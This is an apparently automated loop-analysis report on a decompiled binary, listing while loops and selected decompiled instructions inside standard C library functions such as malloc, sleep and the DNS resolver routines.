=============================WHILE LOOPS ID : 216 @ strstr ====================================
++++++++ WHILE START : 36602 
++++++++ WHILE FUNCTION : strstr 
++++++++ WHILE END : 36706 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 217 @ strcasestr ====================================
++++++++ WHILE START : 37457 
++++++++ WHILE FUNCTION : strcasestr 
++++++++ WHILE END : 37518 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 221 @ malloc ====================================
++++++++ WHILE START : 42874 
++++++++ WHILE FUNCTION : malloc 
++++++++ WHILE END : 44852 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		free(v181);
		free(v181);
		free(v181);
		free(v181);
		free(v181);
		free(v181);
		free(v181);
		free(v181);
		free(v181);
		free(v181);
		free(v181);
		free(v181);
		free(v181);
		free(v181);
		free(v181);
		free(v181);
=============================WHILE LOOPS ID : 225 @ __malloc_consolidate ====================================
++++++++ WHILE START : 46315 
++++++++ WHILE FUNCTION : __malloc_consolidate 
++++++++ WHILE END : 46437 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 226 @ abort ====================================
++++++++ WHILE START : 47087 
++++++++ WHILE FUNCTION : abort 
++++++++ WHILE END : 47161 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_sigprocmask(1, (struct _TYPEDEF_sigset_t *)&v146, 0);
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 227 @ srandom_r ====================================
++++++++ WHILE START : 48444 
++++++++ WHILE FUNCTION : srandom_r 
++++++++ WHILE END : 48482 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_random_r((int32_t *)v144, (int32_t)&v150);
		__GI_random_r((int32_t *)v144, (int32_t)&v150);
=============================WHILE LOOPS ID : 232 @ sleep ====================================
++++++++ WHILE START : 50171 
++++++++ WHILE FUNCTION : sleep 
++++++++ WHILE END : 50265 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v150 = __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v146, v149); // 0x8055273
		while (true) {
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v148, 0);
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v148, 0);
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v148, 0);
=============================WHILE LOOPS ID : 236 @ __stdio_WRITE ====================================
++++++++ WHILE START : 56215 
++++++++ WHILE FUNCTION : __stdio_WRITE 
++++++++ WHILE END : 56282 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 239 @ _fpmaxtostr ====================================
++++++++ WHILE START : 57659 
++++++++ WHILE FUNCTION : _fpmaxtostr 
++++++++ WHILE END : 60820 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 240 @ _fpmaxtostr ====================================
++++++++ WHILE START : 60830 
++++++++ WHILE FUNCTION : _fpmaxtostr 
++++++++ WHILE END : 60929 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 248 @ __GI_strpbrk ====================================
++++++++ WHILE START : 62116 
++++++++ WHILE FUNCTION : __GI_strpbrk 
++++++++ WHILE END : 62165 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 249 @ inet_aton ====================================
++++++++ WHILE START : 62325 
++++++++ WHILE FUNCTION : inet_aton 
++++++++ WHILE END : 62419 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 250 @ __dns_lookup ====================================
++++++++ WHILE START : 62604 
++++++++ WHILE FUNCTION : __dns_lookup 
++++++++ WHILE END : 63350 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_close(-1);
		int32_t v166 = inet_pton(-1, (char *)v158, (int32_t)&v153, (int32_t)&v153); // 0x80569ae
		inet_addr(-1);
		if (socket(-1, v158, (int32_t)&v153) >= 0) {
		if (__libc_connect(-1, v158, (int32_t)&v153) >= 0) {
		__libc_send(-1, v158, (int32_t)&v153, (int32_t)&v153);
		int32_t v175 = __libc_recv(-1, v158, (int32_t)&v153, (int32_t)&v153); // 0x8056a9e
		__libc_close(v148);
		free(v149);
		free(v149);
		while (true) {
		while (true) {
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		__libc_close(v148);
		free(v149);
		free(v149);
		__libc_close(v148);
		free(v149);
		free(v149);
		__libc_close(v148);
		free(v149);
		free(v149);
		__libc_close(v148);
		free(v149);
		free(v149);
=============================WHILE LOOPS ID : 251 @ __open_nameservers ====================================
++++++++ WHILE START : 63695 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 63716 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v156, 128, v148) == 0) {
		__GI_fclose((int16_t *)v146);
=============================WHILE LOOPS ID : 252 @ __open_nameservers ====================================
++++++++ WHILE START : 63718 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 63759 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 253 @ __open_nameservers ====================================
++++++++ WHILE START : 63768 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 63883 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 255 @ __open_nameservers ====================================
++++++++ WHILE START : 63932 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 63945 
++++++++ INTRESTING INSTRUCTIONS :  
		free(v194);
=============================WHILE LOOPS ID : 256 @ __open_nameservers ====================================
++++++++ WHILE START : 63996 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 64008 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v156, 128, v148) != 0) {
		__GI_fclose((int16_t *)v146);
=============================WHILE LOOPS ID : 258 @ __open_nameservers ====================================
++++++++ WHILE START : 64031 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 64042 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v156, 128, v148) != 0) {
		__GI_fclose((int16_t *)v146);
=============================WHILE LOOPS ID : 259 @ _stdio_openlist_dec_use ====================================
++++++++ WHILE START : 67346 
++++++++ WHILE FUNCTION : _stdio_openlist_dec_use 
++++++++ WHILE END : 67383 
++++++++ INTRESTING INSTRUCTIONS :  
		free(v153);
=============================WHILE LOOPS ID : 261 @ __GI_fgets_unlocked ====================================
++++++++ WHILE START : 67797 
++++++++ WHILE FUNCTION : __GI_fgets_unlocked 
++++++++ WHILE END : 67857 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v151 = getc_unlocked(); // 0x80579bd
=============================WHILE LOOPS ID : 266 @ __GI_strspn ====================================
++++++++ WHILE START : 68631 
++++++++ WHILE FUNCTION : __GI_strspn 
++++++++ WHILE END : 68676 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 268 @ inet_pton ====================================
++++++++ WHILE START : 69247 
++++++++ WHILE FUNCTION : inet_pton 
++++++++ WHILE END : 69486 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		if (inet_pton4(v162, (int32_t)v163, v152) >= 1) {
=============================WHILE LOOPS ID : 270 @ __GI_inet_ntop ====================================
++++++++ WHILE START : 69892 
++++++++ WHILE FUNCTION : __GI_inet_ntop 
++++++++ WHILE END : 70234 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		v192 = inet_ntop4((int32_t)v151, (int32_t)v165, v164);
		v189 = v148 + sprintf(v186, (int32_t)"%x");
		v192 = inet_ntop4((int32_t)v151, (int32_t)v165, v164);
		v189 = v148 + sprintf(v186, (int32_t)"%x");
		while (true) {
=============================WHILE LOOPS ID : 273 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 71488 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 71503 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v169 = __GI_strcasecmp(v164, v168, v167, v167); // 0x8058572
=============================WHILE LOOPS ID : 274 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 71505 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 71518 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v151, v149, v147) != 0) {
		__GI_fclose((int16_t *)v149);
=============================WHILE LOOPS ID : 275 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 71568 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 71817 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		if (fgets(v151, v149, v147) != 0) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		int32_t v199 = fgets(v151, v149, v198); // 0x80585d9
		v179 = __GI_fclose((int16_t *)v149);
		if (inet_pton(2, (char *)v202, (int32_t)v153, v148) >= 1) {
		while (true) {
		__GI_fclose((int16_t *)v149);
		__GI_fclose((int16_t *)v149);
=============================WHILE LOOPS ID : 279 @ __decode_dotted ====================================
++++++++ WHILE START : 73073 
++++++++ WHILE FUNCTION : __decode_dotted 
++++++++ WHILE END : 73139 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
